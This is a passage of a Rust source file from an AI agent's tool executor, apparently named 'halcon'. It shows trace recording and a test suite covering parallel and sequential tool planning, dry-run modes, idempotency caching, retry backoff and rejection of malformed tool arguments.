            is_parallel: false,
            input_summary: None,
            created_at: Utc::now(),
        };
        if let Err(e) = db.inner().insert_tool_metric(&tool_metric) {
            tracing::warn!("tool_execution_metrics insert failed: {e}");
        }
    }

    let _ = event_tx.send(DomainEvent::new(EventPayload::ToolExecuted {
        tool: tool_call.name.clone(),
        permission: perm_level,
        duration_ms: result.duration_ms,
        success: !is_error,
    }));

    render_sink.tool_output(&result.content_block, result.duration_ms);

    // Trace: record tool result.
    if let Some(db) = trace_db {
        let content = match &result.content_block {
            ContentBlock::ToolResult { content, .. } => content.as_str(),
            _ => "",
        };
        let step = TraceStep {
            session_id,
            step_index: *trace_step_index,
            step_type: TraceStepType::ToolResult,
            data_json: serde_json::json!({
                "tool_use_id": &tool_call.id,
                "tool_name": &tool_call.name,
                "content": content,
                "is_error": is_error,
                "duration_ms": result.duration_ms,
            })
            .to_string(),
            duration_ms: result.duration_ms,
            timestamp: Utc::now(),
        };
        if let Err(e) = db.inner().append_trace_step(&step) {
            tracing::warn!("trace recording failed (step {}): {e}", *trace_step_index);
        }
        *trace_step_index += 1;
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::render::sink::SilentSink;

    static TEST_SINK: std::sync::LazyLock<SilentSink> =
        std::sync::LazyLock::new(SilentSink::new);

    fn make_completed(id: &str, name: &str) -> CompletedToolUse {
        CompletedToolUse {
            id: id.to_string(),
            name: name.to_string(),
            input: serde_json::json!({}),
        }
    }

    #[test]
    fn plan_partitions_readonly_vs_destructive() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tools = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "bash"),
            make_completed("t3", "grep"),
            make_completed("t4", "file_write"),
        ];

        let plan = plan_execution(tools, &registry);

        // file_read and grep are ReadOnly -> parallel
        let par_names: Vec<&str> = plan.parallel_batch.iter().map(|t| t.name.as_str()).collect();
        assert!(par_names.contains(&"file_read"));
        assert!(par_names.contains(&"grep"));

        // bash is Destructive, file_write is Destructive -> sequential
        let seq_names: Vec<&str> = plan.sequential_batch.iter().map(|t| t.name.as_str()).collect();
        assert!(seq_names.contains(&"bash"));
        assert!(seq_names.contains(&"file_write"));
    }

    #[test]
    fn plan_unknown_tool_goes_sequential() {
        let registry = ToolRegistry::new();


        let tools = vec![make_completed("t1", "nonexistent_tool")];
        let plan = plan_execution(tools, &registry);

        assert!(plan.parallel_batch.is_empty());
        assert_eq!(plan.sequential_batch.len(), 1);
    }

    #[test]
    fn plan_all_readonly_all_parallel() {
        let registry = halcon_tools::default_registry(&Default::default());


        let tools = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "glob"),
            make_completed("t3", "grep"),
        ];

        let plan = plan_execution(tools, &registry);
        assert_eq!(plan.parallel_batch.len(), 3);
        assert!(plan.sequential_batch.is_empty());
    }

    #[test]
    fn plan_all_destructive_all_sequential() {
        let registry = halcon_tools::default_registry(&Default::default());


        let tools = vec![
            make_completed("t1", "bash"),
            make_completed("t2", "file_write"),
            make_completed("t3", "file_edit"),
        ];

        let plan = plan_execution(tools, &registry);
        assert!(plan.parallel_batch.is_empty());
        assert_eq!(plan.sequential_batch.len(), 3);
    }

    #[test]
    fn plan_empty_input() {
        let registry = ToolRegistry::new();


        let plan = plan_execution(vec![], &registry);
        assert!(plan.parallel_batch.is_empty());
        assert!(plan.sequential_batch.is_empty());
    }

    #[tokio::test]
    async fn execute_parallel_batch_empty_returns_empty() {
        let registry = ToolRegistry::new();
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let results = execute_parallel_batch(
            &[],
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        assert!(results.is_empty());
    }

    #[tokio::test]
    async fn execute_parallel_batch_unknown_tool() {
        let registry = ToolRegistry::new();
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![make_completed("t1", "nonexistent")];
        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        assert_eq!(results.len(), 1);
        match &results[0].content_block {
            ContentBlock::ToolResult { is_error, content, .. } => {
                assert!(is_error);
                assert!(content.contains("unknown tool"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn parallel_results_sorted_by_id() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![
            make_completed("z_last", "file_read"),
            make_completed("a_first", "file_read"),
            make_completed("m_middle", "file_read"),
        ];

        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        assert_eq!(results.len(), 3);
        assert_eq!(results[0].tool_use_id, "a_first");
        assert_eq!(results[1].tool_use_id, "m_middle");
        assert_eq!(results[2].tool_use_id, "z_last");
    }

    #[tokio::test]
    async fn parallel_results_marked_as_parallel() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![make_completed("t1", "file_read")];
        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        assert!(results[0].was_parallel);
    }

    #[tokio::test]
    async fn parallel_batch_with_trace_recording() {
        use std::sync::Arc;
        use halcon_storage::Database;

        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let db = AsyncDatabase::new(Arc::new(Database::open_in_memory().unwrap()));
        let session_id = uuid::Uuid::new_v4();
        let mut idx = 0u32;

        let batch = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "grep"),
        ];

        execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            Some(&db),
            session_id,
            &mut idx,
            10,
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        // Should have recorded: 1 batch step + 2 individual result steps = 3.
        let steps = db.inner().load_trace_steps(session_id).unwrap();
        assert_eq!(steps.len(), 3);
        // First step is the batch metadata.
        assert!(steps[0].data_json.contains("parallel_batch"));
    }

    #[tokio::test]
    async fn parallel_concurrency_limit_enforced() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        // Create a large batch (20 tools) with concurrency cap of 10.
        let batch: Vec<_> = (0..20)
            .map(|i| make_completed(&format!("t{}", i), "file_read"))
            .collect();

        let start = std::time::Instant::now();
        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(30),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10, // Concurrency cap of 10
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        // All 20 tools should complete.
        assert_eq!(results.len(), 20);
        // All should have tool_use_ids and results.
        assert!(results.iter().all(|r| !r.tool_use_id.is_empty()));
        assert!(results.iter().all(|r| r.tool_name == "file_read"));
        // Execution should complete (buffer_unordered prevents stall).
        assert!(start.elapsed().as_secs() < 25);
    }

    #[tokio::test]
    async fn parallel_concurrency_cap_zero_defaults_to_one() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "file_read"),
        ];

        // max_parallel_tools=0 should default to 1 (no panic, still completes).
        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            0, // 0 defaults to 1
            &ToolExecutionConfig::default(),
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        assert_eq!(results.len(), 2);
        assert!(results.iter().all(|r| r.was_parallel));
    }

    // --- Sub-Phase 16.0: Dry-run mode tests ---

    #[tokio::test]
    async fn dry_run_off_executes_normally() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "file_read");
        let result = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, None, &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        // file_read on non-existent path produces an error, but it DID execute (not a dry-run skip).
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(!content.contains("[dry-run]"), "Off mode should execute normally");
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn dry_run_full_skips_all_tools() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "file_read");
        let result = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Full, None, &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        match &result.content_block {
            ContentBlock::ToolResult { content, is_error, .. } => {
                assert!(content.contains("[dry-run]"));
                assert!(content.contains("file_read"));
                assert!(!is_error);
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn dry_run_full_returns_synthetic_result() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "bash");
        let result = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Full, None, &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        assert_eq!(result.duration_ms, 0);
        assert_eq!(result.tool_name, "bash");
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(content.contains("[dry-run]"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn dry_run_destructive_only_skips_bash() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "bash");
        let result = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::DestructiveOnly, None, &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(content.contains("[dry-run]"), "bash should be skipped in DestructiveOnly mode");
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn dry_run_destructive_only_allows_read_file() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "file_read");
        let result = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::DestructiveOnly, None, &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(!content.contains("[dry-run]"), "file_read should execute in DestructiveOnly mode");
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn synthetic_result_contains_tool_name() {
        let tool = make_completed("t1", "file_write");
        let result = synthetic_dry_run_result(&tool);
        assert_eq!(result.tool_name, "file_write");
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(content.contains("file_write"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn synthetic_result_is_not_error() {
        let tool = make_completed("t1", "bash");
        let result = synthetic_dry_run_result(&tool);
        match &result.content_block {
            ContentBlock::ToolResult { is_error, .. } => {
                assert!(!is_error);
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn tool_execution_config_default_is_off() {
        let config = ToolExecutionConfig::default();
        assert_eq!(config.dry_run_mode, DryRunMode::Off);
        assert!(config.idempotency.is_none());
    }

    #[tokio::test]
    async fn execute_parallel_with_dry_run_full() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;

        let batch = vec![
            make_completed("t1", "file_read"),
            make_completed("t2", "grep"),
        ];

        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::Full,
            idempotency: None,
            ..Default::default()
        };

        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &config,
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        assert_eq!(results.len(), 2);
        for result in &results {
            match &result.content_block {
                ContentBlock::ToolResult { content, .. } => {
                    assert!(content.contains("[dry-run]"));
                }
                _ => panic!("expected ToolResult"),
            }
        }
    }

    #[tokio::test]
    async fn execute_sequential_with_dry_run_full() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;
        let mut perms = ConversationalPermissionHandler::new(true);

        let tool = make_completed("t1", "bash");
        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::Full,
            idempotency: None,
            ..Default::default()
        };

        let result = execute_sequential_tool(
            &tool,
            &registry,
            &mut perms,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            &config,
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        match &result.content_block {
            ContentBlock::ToolResult { content, is_error, .. } => {
                assert!(content.contains("[dry-run]"));
                assert!(!is_error);
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn execute_sequential_with_dry_run_destructive_only() {
        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;
        let mut perms = ConversationalPermissionHandler::new(true);

        // file_write is Destructive — should be skipped in DestructiveOnly mode.
        let tool = make_completed("t1", "file_write");
        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::DestructiveOnly,
            idempotency: None,
            ..Default::default()
        };

        let result = execute_sequential_tool(
            &tool,
            &registry,
            &mut perms,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            &config,
            &*TEST_SINK,
            None, // plugin_registry
        )
        .await;

        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(content.contains("[dry-run]"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn tool_execution_config_with_idempotency_none() {
        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::Off,
            idempotency: None,
            ..Default::default()
        };
        assert_eq!(config.dry_run_mode, DryRunMode::Off);
        assert!(config.idempotency.is_none());
    }

    // --- Sub-Phase 16.1: Idempotency tests ---

    #[tokio::test]
    async fn idempotency_deduplicates_identical_tool_call() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "file_read".to_string(),
            input: serde_json::json!({"path": "/tmp/nonexistent_test_file_abc123"}),
        };

        // First call: executes and records.
        let r1 = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        assert_eq!(idem.len(), 1);

        // Second call with same args: returns cached result.
        let r2 = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        assert_eq!(idem.len(), 1); // No new record.

        // Both should have the same content.
        let c1 = match &r1.content_block { ContentBlock::ToolResult { content, .. } => content.clone(), _ => String::new() };
        let c2 = match &r2.content_block { ContentBlock::ToolResult { content, .. } => content.clone(), _ => String::new() };
        assert_eq!(c1, c2);
    }

    #[tokio::test]
    async fn idempotency_different_args_not_cached() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool1 = CompletedToolUse {
            id: "t1".to_string(),
            name: "file_read".to_string(),
            input: serde_json::json!({"path": "/tmp/aaa"}),
        };
        let tool2 = CompletedToolUse {
            id: "t2".to_string(),
            name: "file_read".to_string(),
            input: serde_json::json!({"path": "/tmp/bbb"}),
        };

        execute_one_tool(&tool1, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        execute_one_tool(&tool2, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        assert_eq!(idem.len(), 2); // Two distinct entries.
    }

    #[tokio::test]
    async fn idempotency_records_after_execution() {
        use crate::repl::idempotency::{IdempotencyRegistry, compute_execution_id};

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool = make_completed("t1", "file_read");
        let exec_id = compute_execution_id("file_read", &serde_json::json!({}), "");

        assert!(idem.lookup(&exec_id).is_none());
        execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        assert!(idem.lookup(&exec_id).is_some());
    }

    #[tokio::test]
    async fn idempotency_returns_cached_content() {
        use crate::repl::idempotency::{IdempotencyRegistry, ExecutionRecord};

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        // Pre-seed the registry with a fake cached result.
        let exec_id = crate::repl::idempotency::compute_execution_id("file_read", &serde_json::json!({}), "");
        idem.record(ExecutionRecord {
            execution_id: exec_id,
            tool_name: "file_read".to_string(),
            result_content: "cached output".to_string(),
            is_error: false,
            executed_at: chrono::Utc::now(),
        });

        let tool = make_completed("t1", "file_read");
        let result = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert_eq!(content, "cached output");
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn idempotency_none_executes_normally() {
        let registry = halcon_tools::default_registry(&Default::default());
        let tool = make_completed("t1", "file_read");
        // No idempotency (None) — should execute normally.
        let result = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, None, &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        match &result.content_block {
            ContentBlock::ToolResult { content, .. } => {
                assert!(!content.contains("cached output"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[tokio::test]
    async fn idempotency_registry_survives_multiple_rounds() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool = make_completed("t1", "file_read");
        // Round 1.
        execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        // Round 2 (same tool).
        execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        // Round 3 (same tool).
        execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        assert_eq!(idem.len(), 1); // Still just 1 entry.
    }

    #[tokio::test]
    async fn idempotency_with_dry_run_no_record() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        let tool = make_completed("t1", "file_read");
        // Dry-run full: should NOT record to idempotency (tool didn't execute).
        execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Full, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        assert!(idem.is_empty(), "dry-run should not record to idempotency registry");
    }

    #[tokio::test]
    async fn idempotency_error_result_also_cached() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let idem = IdempotencyRegistry::new();

        // file_read on non-existent path → error result.
        let tool = CompletedToolUse {
            id: "t1".to_string(),
            name: "file_read".to_string(),
            input: serde_json::json!({"path": "/tmp/nonexistent_xyz_987654"}),
        };
        let r1 = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        assert_eq!(idem.len(), 1);

        // Second call returns cached error.
        let r2 = execute_one_tool(&tool, &registry, "/tmp", Duration::from_secs(10), DryRunMode::Off, Some(&idem), &ToolRetryConfig::default(), &*TEST_SINK, None).await;
        let e1 = matches!(&r1.content_block, ContentBlock::ToolResult { is_error, .. } if *is_error);
        let e2 = matches!(&r2.content_block, ContentBlock::ToolResult { is_error, .. } if *is_error);
        assert_eq!(e1, e2);
    }

    #[test]
    fn compute_execution_id_in_executor_matches() {
        use crate::repl::idempotency::compute_execution_id;
        let id1 = compute_execution_id("bash", &serde_json::json!({"cmd": "ls"}), "");
        let id2 = compute_execution_id("bash", &serde_json::json!({"cmd": "ls"}), "");
        assert_eq!(id1, id2);
    }

    #[tokio::test]
    async fn idempotency_parallel_batch_dedup() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;
        let idem = IdempotencyRegistry::new();

        // Two identical file_read calls in a parallel batch.
        let batch = vec![
            CompletedToolUse { id: "t1".to_string(), name: "file_read".to_string(), input: serde_json::json!({"path": "/tmp"}) },
            CompletedToolUse { id: "t2".to_string(), name: "file_read".to_string(), input: serde_json::json!({"path": "/tmp"}) },
        ];

        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::Off,
            idempotency: Some(&idem),
            ..Default::default()
        };

        let results = execute_parallel_batch(
            &batch, &registry, "/tmp", Duration::from_secs(10),
            &event_tx, None, uuid::Uuid::new_v4(), &mut idx, 10, &config, &*TEST_SINK,
            None, // plugin_registry
        ).await;

        assert_eq!(results.len(), 2);
        // Only 1 entry in idempotency (deduped by same args).
        assert_eq!(idem.len(), 1);
    }

    // --- Phase 18: Tool retry tests ---

    #[test]
    fn transient_error_detection() {
        assert!(is_transient_error("connection timed out after 30s"));
        assert!(is_transient_error("rate_limit_exceeded"));
        assert!(is_transient_error("429 Too Many Requests"));
        assert!(is_transient_error("Connection reset by peer"));
        assert!(!is_transient_error("file not found: /tmp/missing.rs"));
        assert!(!is_transient_error("permission denied"));
    }

    #[test]
    fn tool_retry_config_defaults() {
        let config = ToolRetryConfig::default();
        assert_eq!(config.max_retries, 2);
        assert_eq!(config.base_delay_ms, 500);
        assert_eq!(config.max_delay_ms, 5000);
    }

    #[test]
    fn tool_retry_config_serde_roundtrip() {
        let config = ToolRetryConfig {
            max_retries: 5,
            base_delay_ms: 1000,
            max_delay_ms: 10000,
        };
        let json = serde_json::to_string(&config).unwrap();
        let rt: ToolRetryConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(rt.max_retries, 5);
        assert_eq!(rt.base_delay_ms, 1000);
        assert_eq!(rt.max_delay_ms, 10000);
    }

    #[test]
    fn permanent_error_not_retried() {
        // Permanent errors should not be classified as transient.
        assert!(!is_transient_error("Error: unknown tool 'foo'"));
        assert!(!is_transient_error("Error: invalid JSON input"));
    }

    #[tokio::test]
    async fn max_retries_zero_executes_once() {
        // With max_retries=0, tool should execute exactly once (no retries).
        // Use an unknown tool to get a deterministic error.
        let registry = ToolRegistry::new();
        let tool = make_completed("t1", "nonexistent_tool");

        let no_retry = ToolRetryConfig {
            max_retries: 0,
            base_delay_ms: 10,
            max_delay_ms: 100,
        };

        let result = execute_one_tool(
            &tool, &registry, "/tmp", Duration::from_secs(10),
            DryRunMode::Off, None, &no_retry, &*TEST_SINK, None,
        ).await;

        // Unknown tool should return error (no retries attempted).
        match &result.content_block {
            ContentBlock::ToolResult { content, is_error, .. } => {
                assert!(*is_error);
                assert!(content.contains("unknown tool"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn backoff_increases_exponentially() {
        let config = ToolRetryConfig {
            max_retries: 5,
            base_delay_ms: 100,
            max_delay_ms: 5000,
        };
        // Base delays before jitter:
        // attempt 0: 100 * 2^0 = 100
        // attempt 1: 100 * 2^1 = 200
        // attempt 2: 100 * 2^2 = 400
        // attempt 3: 100 * 2^3 = 800
        let delays: Vec<u64> = (0..4)
            .map(|attempt| {
                std::cmp::min(
                    config.base_delay_ms * 2u64.pow(std::cmp::min(attempt, 5)),
                    config.max_delay_ms,
                )
            })
            .collect();
        assert_eq!(delays, vec![100, 200, 400, 800]);
    }

    #[test]
    fn jittered_delay_stays_within_bounds() {
        // ±20% jitter means 80% to 120% of base.
        for _ in 0..100 {
            let d = jittered_delay(1000);
            assert!(d >= 800 && d <= 1200, "jittered delay out of range: {d}");
        }
    }

    // ============================================================
    //  Phase 3: Tool Integration Audit Tests
    //  Tests the executor pipeline: tool_call → execute → result chain
    // ============================================================

    mod integration_audit {
        use super::*;

        fn make_tool_call(id: &str, name: &str, args: serde_json::Value) -> CompletedToolUse {
            CompletedToolUse {
                id: id.to_string(),
                name: name.to_string(),
                input: args,
            }
        }

        // --- tool_use_id chain integrity ---

        #[tokio::test]
        async fn tool_use_id_preserved_through_execution() {
            let dir = tempfile::TempDir::new().unwrap();
            let f = dir.path().join("test.txt");
            std::fs::write(&f, "hello integration").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let unique_id = "toolu_integration_abc123";
            let tool_call = make_tool_call(
                unique_id,
                "file_read",
                serde_json::json!({"path": f.to_str().unwrap()}),
            );

            let result = execute_one_tool(
                &tool_call, &registry, dir.path().to_str().unwrap(),
                Duration::from_secs(10), DryRunMode::Off, None,
                &ToolRetryConfig::default(), &*TEST_SINK, None,
            ).await;

            assert_eq!(result.tool_use_id, unique_id);
            match &result.content_block {
                ContentBlock::ToolResult { tool_use_id, content, is_error } => {
                    assert_eq!(tool_use_id, unique_id);
                    assert!(!is_error);
                    assert!(content.contains("hello integration"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn tool_use_id_preserved_on_error() {
            let registry = halcon_tools::default_registry(&Default::default());
            let unique_id = "toolu_error_xyz789";
            let tool_call = make_tool_call(
                unique_id,
                "file_read",
                serde_json::json!({"path": "/nonexistent/path/file.txt"}),
            );

            let result = execute_one_tool(
                &tool_call, &registry, "/tmp",
                Duration::from_secs(10), DryRunMode::Off, None,
                &ToolRetryConfig::default(), &*TEST_SINK, None,
            ).await;

            assert_eq!(result.tool_use_id, unique_id);
            match &result.content_block {
                ContentBlock::ToolResult { tool_use_id, is_error, .. } => {
                    assert_eq!(tool_use_id, unique_id);
                    assert!(is_error);
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn tool_use_id_preserved_for_unknown_tool() {
            let registry = halcon_tools::default_registry(&Default::default());
            let unique_id = "toolu_unknown_456";
            let tool_call = make_tool_call(unique_id, "nonexistent_tool", serde_json::json!({}));

            let result = execute_one_tool(
                &tool_call, &registry, "/tmp",
                Duration::from_secs(10), DryRunMode::Off, None,
                &ToolRetryConfig::default(), &*TEST_SINK, None,
            ).await;

            assert_eq!(result.tool_use_id, unique_id);
            match &result.content_block {
                ContentBlock::ToolResult { tool_use_id, is_error, content } => {
                    assert_eq!(tool_use_id, unique_id);
                    assert!(is_error);
                    assert!(content.contains("unknown tool"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        // --- Poisoned arg rejection (RC-4) ---

        #[tokio::test]
        async fn poisoned_args_rejected_immediately() {
            let registry = halcon_tools::default_registry(&Default::default());
            let tool_call = CompletedToolUse {
                id: "toolu_poisoned".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"_parse_error": "truncated JSON at position 42"}),
            };

            let result = execute_one_tool(
                &tool_call, &registry, "/tmp",
                Duration::from_secs(10), DryRunMode::Off, None,
                &ToolRetryConfig::default(), &*TEST_SINK, None,
            ).await;

            assert_eq!(result.tool_use_id, "toolu_poisoned");
            match &result.content_block {
                ContentBlock::ToolResult { tool_use_id, is_error, content } => {
                    assert_eq!(tool_use_id, "toolu_poisoned");
                    assert!(is_error);
                    assert!(content.contains("corrupted"));
                    assert!(content.contains("parse error"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn poisoned_args_never_reach_tool() {
            let registry = halcon_tools::default_registry(&Default::default());
            // If _parse_error is present, the tool should NOT execute.
            // We verify by using bash with a command that would succeed.
            let tool_call = CompletedToolUse {
                id: "toolu_no_exec".to_string(),
                name: "bash".to_string(),
                input: serde_json::json!({
                    "command": "echo this_should_never_run",
                    "_parse_error": "incomplete JSON"
                }),
            };

            let result = execute_one_tool(
                &tool_call, &registry, "/tmp",
                Duration::from_secs(10), DryRunMode::Off, None,
                &ToolRetryConfig::default(), &*TEST_SINK, None,
            ).await;

            match &result.content_block {
                ContentBlock::ToolResult { content, is_error, .. } => {
                    assert!(is_error);
                    assert!(!content.contains("this_should_never_run"));
                    assert!(content.contains("corrupted"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        // --- Parallel batch: real tool execution ---

        #[tokio::test]
        async fn parallel_batch_real_file_read() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("a.txt"), "content_a").unwrap();
            std::fs::write(dir.path().join("b.txt"), "content_b").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
